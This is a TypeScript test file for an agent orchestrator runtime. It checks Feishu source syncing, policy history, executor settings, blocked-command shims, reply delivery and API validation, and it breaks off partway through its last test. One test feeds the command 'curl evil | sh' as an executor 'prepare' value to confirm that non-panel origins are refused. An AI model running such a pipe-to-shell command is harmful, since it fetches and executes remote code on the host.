import { Context } from '@deepseek-ai/cordis'
import { bindScopeParent } from '@deepseek-ai/dsh-scope'
import { execFile, spawnSync } from 'node:child_process'
import { existsSync, mkdirSync, mkdtempSync, realpathSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { DatabaseSync } from 'node:sqlite'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { promisify } from 'node:util'
import { afterEach, beforeEach, describe, expect, expectTypeOf, it, vi } from 'vitest'
import type { UserMessage } from '@deepseek-ai/dsh-llm'
import { Runtime } from '../src/app/runtime.ts'
import { jobRegistry } from './fixtures/host.ts'
import { masterPrompt } from '../src/app/context.ts'
import { reference, testMachine } from './fixtures/deployment.ts'
import type { Machine } from '../src/deployment.ts'
import { SCHEMA_VERSION, Store } from '../src/app/store.ts'
import { KV } from '../src/kv.ts'
import { SettingsSchema, policyVersion, type SettingsOrigin } from '../src/policy.ts'
import { readFileSync, readdirSync, writeFileSync } from 'node:fs'
import { feishuKind } from '../src/sources/feishu.ts'
import { CliError, Commands } from '../src/infra/commands.ts'
import { key, type Ticket, type Trigger } from '../src/core/index.ts'
import { feishuTrigger } from '../src/sources/feishu.ts'
import { workerGitConfig } from '../src/infra/environment.ts'
import { policyHistory } from '../src/app/settings-history.ts'
import { preview, readable } from '../src/app/views/text.ts'
import type { DingTalkMessage } from '../src/sources/dingtalk.ts'
import { DingTalkListener } from '../src/sources/dingtalk-listener.ts'
import { matchCodexWork } from '../src/executor/codex-desktop.ts'
import { localCodexHistory } from '../src/executor/codex-history.ts'
import { terminalTask, type CommentReceipt, type HiFoxGateway, type HiFoxPilot, type HiFoxTaskStatus, type HiFoxWorkOrder,
  type RunObservation, type TaskReceipt } from '../src/executor/hifox-port.ts'

let runtime: Runtime
let directory: string
let controller: { create: ReturnType<typeof vi.fn>; selectModel: ReturnType<typeof vi.fn>; resolveAgent: ReturnType<typeof vi.fn>; rename: ReturnType<typeof vi.fn>; prompt: ReturnType<typeof vi.fn>; inspect: ReturnType<typeof vi.fn> }
type RegisteredTool = { name: string; output: { render: (args: unknown, result: unknown) => unknown }; execute: (args: unknown, execution: { signal: AbortSignal }) => Promise<unknown> }
let tools: Map<string, Map<string, RegisteredTool>>
type Section = { name: string; text: (context: { signal?: AbortSignal }) => string; interpolate?: boolean }
let sections: Map<string, Section>
type Guard = (execution?: { name: string; arguments: unknown }) => string | undefined
let guards: Map<string, Guard>
let restricts: Map<string, unknown[]>
type HttpHandler = (req: unknown, res: unknown) => Promise<void>
let http: HttpHandler
async function api(method: string, path: string): Promise<{ status: number; body: unknown }> {
  let status = 0, text = ''
  const req = { method, url: `/orchestrator/api/${path}`, headers: { host: '127.0.0.1:3082', 'x-orchestrator-request': '1' } }
  await http(req, { writeHead: (code: number) => { status = code }, end: (data: string) => { text = data } })
  return { status, body: JSON.parse(text) }
}
let agents: Map<string, { id: string; status: string; inbox: { nextTurn: UserMessage[]; nextStep: UserMessage[] }; cancel: ReturnType<typeof vi.fn>; inject: ReturnType<typeof vi.fn> }>
const runTool = async (sessionId: string, name: string, args: unknown) => {
  const tool = tools.get(sessionId)?.get(name)
  if (!tool) throw new Error(`Tool ${name} is not registered for ${sessionId}`)
  const output = await tool.execute(args, { signal: new AbortController().signal })
  expect(JSON.parse(JSON.stringify(output))).toStrictEqual(output)
  await runtime.idle()
  return output as Record<string, unknown>
}
let services: Record<string, unknown>
/** DSH's job registry the Runtime's Executor reads its workers' shell jobs from. */
let jobs: ReturnType<typeof jobRegistry>
/** What worker commands of the startup checks print, by argv; an Error makes the command fail with its message. */
let answers: Record<string, string | Error>
/** Stand-in CLIs on disk, since setup finds executables before it runs them: the agent's, the merge account's and the Feishu bot's. */
const BOT = () => join(directory, 'lark-bot')
const subprocess = { spawn: vi.fn((spec: { argv: readonly string[] }) => {
  // Strip leading `env` and `KEY=VALUE` arguments before looking up the command response.
  const argv = [...spec.argv]
  while (argv[0] === 'env' || /^[A-Z_]+=/.test(argv[0] ?? '')) argv.shift()
  const answer = answers[argv.join(' ')] ?? ''
  const reader = (text: string) => ({ readFrom: () => ({ text, nextOffset: text.length, lossy: false }) })
  return { done: Promise.resolve({ exitCode: answer instanceof Error ? 1 : 0, signal: null }), collected: { stdout: reader(answer instanceof Error ? '' : answer), stderr: reader(answer instanceof Error ? answer.message : '') } }
}) }
/** Source account overrides for test setup; `feishu: null` disables the Feishu source. */
interface Accounts { feishu?: Record<string, unknown> | null }
function seed(store: Store, accounts: Accounts = {}): void {
  const settings = store.settings()
  const { feishu: _feishu, ...others } = settings.sources
  const feishu = accounts.feishu === null ? undefined : { ...settings.sources.feishu?.config, cli: BOT(), ...accounts.feishu }
  store.saveSettings(SettingsSchema.parse({ ...settings, sources: { ...others, ...feishu ? { feishu: { enabled: true, config: feishu } } : { feishu: { enabled: false, config: {} } } } }))
}
let restarts: ReturnType<typeof vi.fn<() => void>>
async function restart(machine: Partial<Machine> = {}, accounts: Accounts = {}, pilot?: HiFoxPilot): Promise<Runtime> {
  await runtime.stop()
  const store = new Store(join(directory, 'orchestrator.sqlite')); seed(store, accounts); store.close()
  const ctx = new Context()
  for (const [name, service] of Object.entries(services)) ctx.reflect.provide(name, service)
  runtime = new Runtime(ctx, testMachine({ stateDir: directory, ...machine }), restarts, pilot)
  return runtime
}
let deliveries: ReturnType<typeof vi.fn<(request: { sessionId: string; mode: 'queue' | 'steer'; id: string; text: string }) => void>>
const MEMBER = 'ou_alice'
const CHAT = 'oc_team'
function feishu(id: string, text: string, overrides: Record<string, unknown> = {}): Trigger {
  return feishuTrigger({ message_id: `om_${id}`, chat_id: CHAT, chat_type: 'group', sender_id: MEMBER, sender_type: 'user', content: text, create_time: String(Date.parse('2026-09-09T00:00:00Z') + Number(id.replace(/\D/g, '') || 0) * 1000), mentions: [{ id: 'ou_bot' }], ...overrides }, 'ou_bot', 'cli_bot')!
}
/** Route one decision with the main Session's orchestrator_route, answering its result; a refused one throws its reason. */
async function route(item: Record<string, unknown>): Promise<Record<string, unknown>> {
  const { results } = await runTool(runtime.masterId, 'orchestrator_route', { decisions: [item] }) as { results: Record<string, unknown>[] }
  if (results[0]!.refused) throw new Error(String(results[0]!.refused))
  return results[0]!
}
beforeEach(async () => {
  directory = mkdtempSync(join(tmpdir(), 'orchestrator-runtime-'))
  vi.spyOn(Commands.prototype, 'lark').mockResolvedValue({ users: [{ member_id: MEMBER, name: 'Alice' }], has_more: false })
  vi.spyOn(Commands.prototype, 'git').mockResolvedValue('')
  vi.spyOn(Commands.prototype, 'run').mockResolvedValue('{"ok":true,"data":{}}')
  restarts = vi.fn()
  answers = {
    [`git -C ${directory} rev-parse --show-toplevel`]: `${directory}\n`,
    [`${BOT()} auth status`]: JSON.stringify({ appId: 'cli_bot', brand: 'feishu', identities: { bot: { status: 'ready' } } }),
    [`${BOT()} config strict-mode`]: 'strict-mode: bot (source: profile)',
    [`${BOT()} api GET /open-apis/bot/v3/info --as bot --format ndjson`]: '{"bot":{"open_id":"ou_bot"},"code":0,"msg":"ok"}',
  }
  const ctx = new Context()
  agents = new Map()
  tools = new Map()
  sections = new Map()
  guards = new Map()
  restricts = new Map()
  deliveries = vi.fn()
  controller = {
    create: vi.fn(async ({ sessionId, agentPreset }) => {
      if (agents.has(sessionId)) return
      const agentCtx = new Context()
      const preset = {}
      const inherited = ['bash', 'read', 'read_image', 'skill', 'job_output', 'job_list', 'job_kill', 'grep', 'web_search',
        'ask_user_question', 'plugin_manager', 'schedule_create', 'create_goal', 'session_create', 'session_send_message', 'feishu_doc_edit']
      const sessionTools = new Map<string, RegisteredTool>()
      tools.set(sessionId, sessionTools)
      agentCtx.reflect.provide('tools', { register: (tool: RegisteredTool) => { sessionTools.set(tool.name,
        tool); return () => sessionTools.delete(tool.name) },
        // Preset tools are inherited; subagent is registered on the agent itself and cannot be named by restrict.
        get: (name: string, scope?: object) => {
          const own = scope === agents.get(sessionId)
          return (scope === preset || own) && inherited.includes(name) || own && name === 'subagent' ? { name } : undefined
        },
        restrict: vi.fn((rule: { allow: string[] }) => {
          if (rule.allow.some(name => !inherited.includes(name))) throw new Error('Restriction names a non-inherited tool')
          restricts.set(sessionId, [...restricts.get(sessionId) ?? [], rule]); return () => {}
        }),
        guard: vi.fn((check: Guard) => { guards.set(sessionId, check); return () => {} }) })
      agentCtx.reflect.provide('skills', { register: () => () => {} })
      agentCtx.reflect.provide('systemPrompt', { section: (spec: Section) => { sections.set(sessionId, spec); return () => {} } })
      const inbox = { nextTurn: [] as UserMessage[], nextStep: [] as UserMessage[],
        // A pending message taken out, as DSH's inbox does by its id.
        remove: (id: string) => [inbox.nextTurn, inbox.nextStep].some(list => {
          const at = list.findIndex(message => message.id === id)
          if (at >= 0) list.splice(at, 1)
          return at >= 0
        }) }
      const modelEvents: { type: string; data: unknown }[] = []
      const deliver = (mode: 'queue' | 'steer') => vi.fn((message: UserMessage) => {
        inbox[mode === 'queue' ? 'nextTurn' : 'nextStep'].push(message)
        deliveries({ sessionId, mode, id: message.id, text: message.content.map(block => block.type === 'text' ? block.text : '').join('') })
        agents.get(sessionId)!.status = 'running'
      })
      agents.set(sessionId, { id: sessionId, ctx: agentCtx, inbox, followup: deliver('queue'), steer: deliver('steer'), status: 'idle', inject: vi.fn(), session: { id: sessionId, header: { agentPreset }, snapshotEvents: () => modelEvents, requestHeader: () => undefined, append: vi.fn((type: string, data: unknown) => { modelEvents.push({ type, data }) }) }, cancel: vi.fn(), whenIdle: async () => {} } as never)
      bindScopeParent(agents.get(sessionId)!, preset)
    }),
    selectModel: vi.fn(async () => {}), resolveAgent: vi.fn(async id => agents.has(id) ? { agent: agents.get(id) } : { error: { code: 'session/not-found' } }), rename: vi.fn(async () => {}),
    prompt: vi.fn(() => { throw new Error('Plugin delivery must not use user RPC') }),
    inspect: vi.fn(async () => ({ events: [] })),
  }
  jobs = jobRegistry()
  services = { agents, llm: { resolveCallConfig: vi.fn(async value => value) }, sessionController: controller, sessionPersistence: { flush: vi.fn(async () => {}), open: vi.fn(async () => ({ read: async () => ({ events: [] }), [Symbol.asyncDispose]: async () => {} })) }, workspaceRegistry: { create: async (cwd: string) => ({ id: cwd }) }, permissionPresets: { set: () => {} }, subprocess, webServer: { host: '127.0.0.1', port: 3082, register: (route: { handler: HttpHandler }) => { http = route.handler; return () => {} } }, jobs: jobs.service }
  for (const [name, service] of Object.entries(services)) ctx.reflect.provide(name, service)
  for (const cli of [BOT()]) writeFileSync(cli, '#!/bin/sh\n', { mode: 0o755 })
  const store = new Store(join(directory, 'orchestrator.sqlite')); seed(store); store.close()
  runtime = new Runtime(ctx, testMachine({ stateDir: directory }), restarts)
  await runtime.ready
  // Source kinds are normally registered by plugins that are not loaded in unit tests.
  runtime.sources.register(feishuKind)
  runtime.store.saveSettings({ ...runtime.store.settings(), policy: { ...runtime.store.settings().policy, sources: { feishu: { allowed: [{ id: MEMBER, name: 'Alice' }], syncChat: CHAT } } }, eval: { ...runtime.store.settings().eval, mode: 'auto' }, sources: { feishu: { enabled: true, config: { cli: BOT(), chats: [{ chatId: CHAT, listen: 'all' }], directMessages: true } } } })
  deliveries.mockClear()
})
afterEach(async () => { expect(controller.prompt).not.toHaveBeenCalled(); await runtime?.stop(); vi.restoreAllMocks(); rmSync(directory, { recursive: true, force: true }) })

it('retires persisted GitHub registrations and work without running it or losing its history', async () => {
  const trigger = feishu('legacy', 'old issue')
  const ticket: Ticket = {
    id: 'old-ticket', title: 'Fix issue', decisionId: 'old-decision', createdAt: trigger.at, updatedAt: trigger.at,
    mandate: { actor: { source: 'github', id: 'alice' }, strength: 'explicit', basis: { via: 'listed' }, policyVersion: 'old', scope: 'Fix issue' },
    origin: { triggerId: trigger.id, triggerIds: [trigger.id] }, channels: [], inputs: [], undelivered: [],
    assignments: [{ id: 'old-assignment', createdAt: trigger.at, state: 'pending' }],
  }
  runtime.store.tickets.save(ticket)
  runtime.store.saveSettings({ ...runtime.store.settings(), paused: true,
    sources: { ...runtime.store.settings().sources, github: { enabled: true, config: { cli: '/no-such-gh' } } } })
  const channel = { source: 'github', thread: 'github:42', address: { number: '42' } }
  const ref = { source: 'github', id: '42' }
  runtime.store.triggers.save({ ...trigger, source: 'github', actor: { source: 'github', id: 'alice' }, threads: [ref], channel })
  runtime.store.threads.save({ key: 'github:42', ref, createdAt: trigger.at, meta: {}, correlated: [], subscriptions: [ticket.id], pending: [trigger.id] })
  runtime.outbox.send({ id: 'old-reply', channel, text: 'queued before removal', kind: 'reply', ticketId: ticket.id })
  expect(runtime.store.receipts.get('old-reply')?.status).toBe('pending')
  const next = await restart({}, { feishu: null })
  await next.ready
  expect(next.configured()).toBe(true)
  expect(next.store.settingsHistory().some(version => !!version.settings.sources.github)).toBe(true)
  expect(next.store.settings().sources).not.toHaveProperty('github')
  expect(next.store.tickets.get(ticket.id)).toMatchObject({ ended: { outcome: 'stopped' }, assignments: [{ state: 'ended' }] })
  expect(next.store.threads.get('github:42')).toMatchObject({ subscriptions: [ticket.id], pending: [] })
  expect(next.store.triggers.get(trigger.id)?.source).toBe('github')
  expect(next.store.receipts.get('old-reply')).toMatchObject({ status: 'dropped', dropped: { reason: 'channelGone' } })
  expect(next.effects.pending('reply', 'old-reply')).toBe(false)
  expect(next.effects.pending('launch', ticket.assignments[0]!.id)).toBe(false)
  expect(await api('GET', 'state')).toMatchObject({ status: 200, body: { hifox: { state: 'unconfigured' } } })
})

it('shows a message that carries JSON, with or without a label, as its label and values on lines', () => {
  const text = `GitHub PR #7 CI: ${JSON.stringify({ head: 'abc1234', checks: [{ name: 'e2e', status: 'completed', conclusion: 'failure' }, { name: 'lint', status: 'in_progress', conclusion: null }], statuses: [] })}`
  expect(readable(text)).toBe('GitHub PR #7 CI\nhead: abc1234\nchecks:\n- e2e · completed · failure\n- lint · in_progress\nstatuses: ')
  expect(preview(text)).toBe('GitHub PR #7 CI head: abc1234 checks: e2e · completed · failure lint · in_progress statuses:')
  expect(readable('see {this} later')).toBe('see {this} later')
  expect(readable('label: {not json}')).toBe('label: {not json}')
})

it('keeps Issue Triggers stored before Issues arrived through notifications readable on their Thread', async () => {
  const stored: Trigger = { id: key('github-issue', '5'), source: 'github-issue', threads: [{ source: 'github', id: '5' }],
    actor: { source: 'github', id: 'alice' }, human: true, at: '2026-09-01T00:00:00Z', text: 'Bug\n\ndetails',
    url: 'https://github.com/acme/widgets/issues/5', meta: { number: 5, isPr: false, eligibleAt: '2026-09-02T00:00:00.000Z' } }
  runtime.store.triggers.save(stored)
  runtime.store.threads.save({ key: 'github:5', ref: { source: 'github', id: '5' }, createdAt: stored.at, subscriptions: [], correlated: [],
    pending: [], meta: {} })
  const read = await runTool(runtime.masterId, 'orchestrator_read', { resource: `trigger/${stored.id}` })
  expect(read).toMatchObject({ trigger_id: stored.id, source: 'github-issue', text: 'Bug\n\ndetails' })
  const thread = (await api('GET', 'threads/github:5')).body
  expect(thread).toMatchObject({ timeline: [expect.objectContaining({ id: stored.id, source: 'github-issue' })] })
})

it('reports a Source that was switched on as starting until its next pass reports its health', async () => {
  const save = (enabled: boolean) => runtime.settings.save('source:feishu', { enabled, config: runtime.store.settings().sources.feishu!.config }, runtime.store.blockRevision('source:feishu'), 'panel')
  const sourceHealth = async () => ((await api('GET', 'sources')).body as { id: string; health: unknown[] }[]).find(source => source.id === 'feishu')!.health
  await save(false)
  runtime.context(feishuKind).report('feishu', { state: 'paused', detail: 'Off', code: 'sourceOff' })
  await save(true)
  expect(await sourceHealth()).toContainEqual({ name: 'feishu', state: 'starting', detail: '' })
  // A part that reports something else, such as a missing CLI, keeps its report: no pass may come to replace it.
  await save(false)
  runtime.context(feishuKind).report('feishu', { state: 'paused', detail: 'x', code: 'feishuCliUnset' })
  await save(true)
  expect(await sourceHealth()).toContainEqual(expect.objectContaining({ code: 'feishuCliUnset' }))
})

it('syncs a Source\'s list once its plugin loads after dsh-superagent started', async () => {
  const next = await restart()
  await next.ready
  vi.mocked(Commands.prototype.lark).mockResolvedValue({ users: [{ member_id: MEMBER, name: 'Alice' }], has_more: false })
  next.sources.register(feishuKind)
  await vi.waitFor(() => expect(next.health['sync:feishu']).toMatchObject({ state: 'ready' }))
})

it('syncs the Feishu part of the Policy from its sync chat in place, and keeps the Policy version when only the order the chat lists changes', async () => {
  const policy = runtime.store.settings().policy
  await runtime.settings.save('policy', { ...policy, sources: { ...policy.sources, feishu: { allowed: [{ id: 'ou_bob', name: 'Bob' }, { id: MEMBER, name: 'Alice' }], syncChat: CHAT } } }, runtime.store.blockRevision('policy'), 'panel')
  vi.mocked(Commands.prototype.lark).mockResolvedValue({ users: [{ member_id: 'ou_erin', name: 'Erin' }, { member_id: MEMBER, name: 'Alice Liddell' }], has_more: false })
  expect(await runtime.settings.sync('feishu')).toEqual({ allowed: [{ id: MEMBER, name: 'Alice Liddell' }, { id: 'ou_erin', name: 'Erin' }], syncChat: CHAT, admission: {} })
  expect(runtime.store.settings().policy.sources.feishu!.allowed.map(entry => entry.id)).toEqual([MEMBER, 'ou_erin'])
  expect(runtime.health['sync:feishu']).toMatchObject({ state: 'ready', detail: '2 allowed' })
  const version = policyVersion(runtime.store.settings())
  vi.mocked(Commands.prototype.lark).mockResolvedValue({ users: [{ member_id: MEMBER, name: 'Alice Liddell' }, { member_id: 'ou_erin', name: 'Erin' }], has_more: false })
  await runtime.settings.sync('feishu')
  expect(policyVersion(runtime.store.settings())).toBe(version)
  vi.mocked(Commands.prototype.lark).mockRejectedValue(new Error('rate limited'))
  await expect(runtime.settings.sync('feishu')).rejects.toThrow('rate limited')
  expect(runtime.health['sync:feishu']).toMatchObject({ state: 'error', detail: expect.stringContaining('rate limited') })
})

it('describes rule edits in the Policy history and skips Policy syncs that change nothing', async () => {
  const settings = runtime.store.settings()
  const revision = () => runtime.store.get('settings-revision') as number
  const before = revision()
  // The sync chat lists exactly the allowed users already, so nothing is saved.
  await runtime.settings.sync('feishu')
  expect(revision()).toBe(before)
  await runtime.settings.save('policy', { ...runtime.store.settings().policy, rules: [{ ...settings.policy.rules[0]!, name: '文案' }, { ...settings.policy.rules[1]!, enabled: false }, { id: 'docs', name: '文档', enabled: true, instruction: 'x' }] }, runtime.store.blockRevision('policy'), 'panel')
  expect(policyHistory(runtime.store, runtime.sources, policyVersion(runtime.store.settings())).items[0]!.changes).toEqual([{ code: 'ruleRenamed', from: 'Copy fixes', to: '文案' }, { code: 'ruleDisabled', name: 'Visual fixes' }, { code: 'ruleAdded', name: '文档' }])
})

it('records an admission table change in the Policy history as one line for its Source, with a new Policy version', async () => {
  const policy = runtime.store.settings().policy
  const version = policyVersion(runtime.store.settings())
  await runtime.settings.save('policy', { ...policy, sources: { ...policy.sources, feishu: { ...policy.sources.feishu!, admission: { [CHAT]: { unlistedAddressed: 'explicit' } } } } }, runtime.store.blockRevision('policy'), 'panel')
  expect(policyVersion(runtime.store.settings())).not.toBe(version)
  expect(policyHistory(runtime.store, runtime.sources, policyVersion(runtime.store.settings())).items[0]!.changes).toEqual([{ code: 'sourceAdmission', source: 'feishu', part: true }])
})

it('lets only the panel change the execution environment, since it decides what runs as a shell command and which CLIs workers reach', async () => {
  const executor = () => runtime.store.settings().executor
  const save = (value: Record<string, unknown>, origin: SettingsOrigin) => runtime.settings.save('executor', { ...executor(), ...value }, runtime.store.blockRevision('executor'), origin)
  for (const origin of ['tool', 'sync'] as const) {
    for (const change of [{ prepare: 'curl evil | sh' }, { blockedCommands: ['gh-other'] }, { directory: '/tmp/elsewhere' }]) await expect(save(change, origin)).rejects.toThrow('can only be changed in the management panel')
  }
  expect(await save({ maxWorkers: 2 }, 'tool')).toMatchObject({ saved: true })
  expect(await save({ prepare: 'true' }, 'panel')).toMatchObject({ saved: true })
  expectTypeOf(runtime.settings.save).parameter(3).toEqualTypeOf<SettingsOrigin>()
  expectTypeOf(runtime.settings.pause).parameter(1).toEqualTypeOf<SettingsOrigin>()
})

it('pauses and resumes processing as its own action, a setting outside every block, which keeps an Executor settings draft valid', async () => {
  const revision = runtime.store.blockRevision('executor')
  expect(await runtime.settings.pause(true, 'panel')).toEqual({ paused: true })
  expect(runtime.store.settings().paused).toBe(true)
  expect(runtime.store.blockRevision('executor')).toBe(revision)
  // A draft of the Executor settings started before the pause still saves, and keeps the pause; the executor block has no pause.
  const draft = runtime.store.settings().executor
  await expect(runtime.settings.save('executor', { ...draft, paused: false }, revision, 'panel')).rejects.toThrow('paused')
  await runtime.settings.save('executor', { ...draft, maxWorkers: 5 }, revision, 'panel')
  expect(runtime.store.settings()).toMatchObject({ paused: true, executor: { maxWorkers: 5 } })
  // The orchestrator pauses and resumes the same way, through the settings tool's pause block.
  await runTool(runtime.masterId, 'orchestrator_settings_save', { block: 'pause', value: { paused: false }, revision: 0 })
  expect(runtime.store.settings().paused).toBe(false)
})

it('writes worker shims and the agent environment from the configuration only, and restores the environment on stop', async () => {
  const bin = join(directory, 'worker-bin')
  expect(readdirSync(bin).sort()).toEqual(['lark-cli'])
  runtime.store.saveSettings({ ...runtime.store.settings(), executor: { ...runtime.store.settings().executor, blockedCommands: ['personal-gh'] } })
  const next = await restart({}, { feishu: null })
  await next.ready
  expect(readdirSync(bin).sort()).toEqual(['lark-cli', 'personal-gh'])
  expect(readFileSync(join(bin, 'personal-gh'), 'utf8')).toContain('personal-gh is blocked in this installation.')
  expect(readFileSync(join(bin, 'lark-cli'), 'utf8')).toContain('lark-cli is unavailable: this installation has no Feishu bot.')
  expect(process.env).toMatchObject({ GIT_CONFIG_GLOBAL: workerGitConfig(directory), GIT_CONFIG_NOSYSTEM: '1' })
  expect(process.env.GIT_AUTHOR_NAME).toBeUndefined()
  expect(process.env.PATH?.split(':')[0]).toBe(bin)
  await next.stop()
  expect(process.env.GIT_CONFIG_GLOBAL).toBeUndefined()
  expect(process.env.PATH?.split(':')).not.toContain(bin)
})

it('waits for setup when the shim directory holds a file dsh-superagent did not write, and leaves the file alone', async () => {
  writeFileSync(join(directory, 'worker-bin', 'my-script'), '#!/bin/sh\n')
  const next = await restart()
  await next.ready
  expect(next.configured()).toBe(false)
  expect(next.setupProblem).toMatchObject({ place: 'deployment', code: 'foreignFile', values: { file: join(directory, 'worker-bin', 'my-script') } })
  expect(readFileSync(join(directory, 'worker-bin', 'my-script'), 'utf8')).toBe('#!/bin/sh\n')
  await next.stop()
})

it('rewrites the blocked-command shims when the Executor settings change them, without a restart', async () => {
  const bin = join(directory, 'worker-bin')
  const save = (blockedCommands: string[]) => runtime.settings.save('executor', { ...runtime.store.settings().executor, blockedCommands }, runtime.store.blockRevision('executor'), 'panel')
  expect(await save(['personal-gh'])).toMatchObject({ saved: true, restarting: false })
  expect(readdirSync(bin).sort()).toEqual(['lark-cli', 'personal-gh'])
  await save([])
  expect(readdirSync(bin).sort()).toEqual(['lark-cli'])
  // The commands workers need cannot be blocked.
  await expect(save(['git'])).rejects.toThrow()
  expect(restarts).not.toHaveBeenCalled()
})

it('rereads a Source\'s display names on request, reports the new ones and keeps the list when the read fails', async () => {
  runtime.store.set('source-labels:feishu', { oc_team: 'Team' })
  const lark = vi.spyOn(Commands.prototype, 'lark').mockResolvedValue({ chats: [{ chat_id: 'oc_team', name: 'Team' }, { chat_id: 'oc_new', name: 'New chat' }] })
  expect(await runtime.settings.refreshLabels('feishu')).toEqual({ added: ['New chat'] })
  expect(lark).toHaveBeenCalledWith(['im', '+chat-list', '--page-all', '--page-size', '100'])
  expect(runtime.store.get('source-labels:feishu')).toEqual({ oc_team: 'Team', oc_new: 'New chat' })
  lark.mockRejectedValue(new Error('token expired'))
  await expect(runtime.settings.refreshLabels('feishu')).rejects.toThrow('token expired')
  expect(runtime.store.get('source-labels:feishu')).toEqual({ oc_team: 'Team', oc_new: 'New chat' })
})

it('drops a message only when its conversation is gone or not listened to, newest drop first, and keeps it while its Source is off', async () => {
  const channel = feishu('7', 'x').channel!
  // Messages of no Ticket keep no order, so none waits behind another.
  const queue = (id: string, address: Record<string, string>) => { runtime.outbox.send({ id, channel: { ...channel, address }, text: '已合并。', kind: 'notice' }) }
  queue('gone-reply', channel.address)
  queue('failing-reply', { ...channel.address, messageId: 'om_8' })
  vi.mocked(Commands.prototype.lark).mockImplementation(async args => {
    const replying = args.join(' ')
    if (replying.includes('om_7')) throw new CliError('the message was withdrawn', 230011)
    if (replying.includes('om_9')) return {}
    // Text that names a withdrawal is no answer from Feishu that the conversation is gone.
    throw new Error('Request failed: withdrawn tokens are not recalled messages')
  })
  await runtime.sendReplies()
  // The Feishu Channel reads the recall code as gone; any other failure keeps the reply for a retry.
  expect(runtime.store.replyStatus('gone-reply')).toBe('dropped')
  expect(runtime.store.replyStatus('failing-reply')).toBe('pending')
  const settings = runtime.store.settings(), feishuSource = settings.sources.feishu!
  runtime.store.saveSettings({ ...settings, sources: { ...settings.sources, feishu: { ...feishuSource, enabled: false } } })
  queue('off-reply', { ...channel.address, messageId: 'om_9' })
  queue('ignored-reply', { chatId: 'oc_elsewhere', messageId: 'om_10' })
  await runtime.sendReplies()
  expect([runtime.store.replyStatus('off-reply'), runtime.store.replyStatus('ignored-reply')]).toEqual(['pending', 'pending'])
  // Once the Source is on again, the messages that waited go out or are dropped when they are tried again, after 5 seconds.
  runtime.store.saveSettings(settings)
  vi.useFakeTimers({ toFake: ['Date'], now: Date.now() + 5000 })
  try { await runtime.sendReplies() } finally { vi.useRealTimers() }
  expect([runtime.store.replyStatus('off-reply'), runtime.store.replyStatus('ignored-reply')]).toEqual(['sent', 'dropped'])
  const dropped = ((await api('GET', 'sources')).body as unknown as { dropped: { id: string }[] }[]).flatMap(source => source.dropped)
  expect(dropped).toMatchObject([{ id: 'ignored-reply', dropped: { reason: 'channelIgnored' } }, { id: 'gone-reply', dropped: { reason: 'channelGone' } }])
})

it('refuses a settings save with an unknown model or a Source kind that is not installed, an oversized prompt, an unknown revision and a malformed path with 4xx', async () => {
  const request = async (method: string, path: string, body?: unknown) => {
    let status = 0, text = ''
    const chunks = body === undefined ? [] : [Buffer.from(JSON.stringify(body))]
    const req = { method, url: `/orchestrator/api/${path}`, headers: { host: '127.0.0.1:3082', 'x-orchestrator-request': '1' }, async *[Symbol.asyncIterator]() { yield* chunks } }
    await http(req, { writeHead: (code: number) => { status = code }, end: (data: string) => { text = data } })
    return { status, body: JSON.parse(text) as Record<string, unknown> }
  }
  vi.mocked(services.llm as { resolveCallConfig: ReturnType<typeof vi.fn> }).resolveCallConfig.mockRejectedValueOnce(new Error('unknown provider nowhere'))
  const evalBlock = { ...runtime.store.settings().eval, model: { provider: 'nowhere', model: 'x' } }
  expect(await request('PUT', 'settings/eval', { value: evalBlock, revision: runtime.store.blockRevision('eval') }))
    .toMatchObject({ status: 400, body: { code: 'modelUnavailable', values: { block: 'eval', error: 'unknown provider nowhere' } } })
  const stored = runtime.store.settings()
  runtime.store.saveSettings({ ...stored, sources: { ...stored.sources, slack: { enabled: false, config: {} } } })
  expect(await request('PUT', 'settings/source:slack', { value: { enabled: true, config: {} }, revision: 0 }))
    .toMatchObject({ status: 400, body: { code: 'sourceNotInstalled', values: { source: 'slack' } } })
  const huge = { ...runtime.prompts.current().config, delivery: 'x'.repeat(runtime.machine.promptMaxChars.get()) }
  expect(await request('POST', 'prompts/preview', huge)).toMatchObject({ status: 400, body: { code: 'promptTooLong' } })
  expect(await request('PUT', 'prompts', { config: huge, baseRevision: runtime.prompts.current().revision })).toMatchObject({ status: 400, body: { code: 'promptTooLong' } })
  // An override of a part this version does not have is refused, not missing.
  expect(await request('PUT', 'prompts', { config: { ...runtime.prompts.current().config, overrides: { 'runtime/nothing': { text: 'x' } } },
    baseRevision: runtime.prompts.current().revision })).toMatchObject({ status: 400, body: { code: 'unknownPromptPart' } })
  expect(await request('GET', 'prompts?revision=99')).toMatchObject({ status: 404, body: { code: 'unknownPromptRevision' } })
  expect(await request('GET', 'threads/%E0%A4%A')).toEqual({ status: 400, body: { error: 'A path segment has a malformed escape' } })
})

it('refuses a second process on the same state directory before it opens the database, so it migrates nothing', () => {
  // A database the running build would read as schema 10 stays as it is.
  const db = new DatabaseSync(join(directory, 'orchestrator.sqlite'))
  db.prepare("UPDATE kv SET value='10' WHERE key='schema'").run()
  db.close()
  const ctx = new Context()
  for (const [name, service] of Object.entries(services)) ctx.reflect.provide(name, service)
  expect(() => new Runtime(ctx, testMachine({ stateDir: directory }), vi.fn())).toThrow(/already being held/)
  expect(runtime.store.get(KV.store.schema)).toBe(10)
  runtime.store.set(KV.store.schema, SCHEMA_VERSION)
})

it('applies a changed prompt size limit to the next save and request without a restart', async () => {
  const limit = reference(100000)
  const next = await restart({ promptMaxChars: limit })
  await next.ready
  const put = async (config: unknown) => {
    let status = 0, text = ''
    const chunks = [Buffer.from(JSON.stringify({ config, baseRevision: next.prompts.current().revision }))]
    const req = { method: 'PUT', url: '/orchestrator/api/prompts', headers: { host: '127.0.0.1:3082', 'x-orchestrator-request': '1' }, async *[Symbol.asyncIterator]() { yield* chunks } }
    await http(req, { writeHead: (code: number) => { status = code }, end: (data: string) => { text = data } })
    return { status, body: JSON.parse(text) as Record<string, unknown> }
  }
  const config = next.prompts.current().config
  const size = JSON.stringify(config).length
  expect(await put({ ...config, delivery: 'x'.repeat(size) })).toMatchObject({ status: 200 })
  // The loader commits a lower limit in place; the next save reads it.
  limit.set(size + 1000)
  expect(await put({ ...config, delivery: `${config.delivery}${'y'.repeat(2000)}` }))
    .toMatchObject({ status: 400, body: { code: 'promptTooLong', values: { limit: String(size + 1000) } } })
  // So does the request body limit, four bytes a character and a margin.
  const bytes = 4 * (size + 1000) + 4096
  expect(await put({ ...config, delivery: 'z'.repeat(bytes) })).toMatchObject({ status: 400, body: { error: `Request exceeds ${bytes} bytes` } })
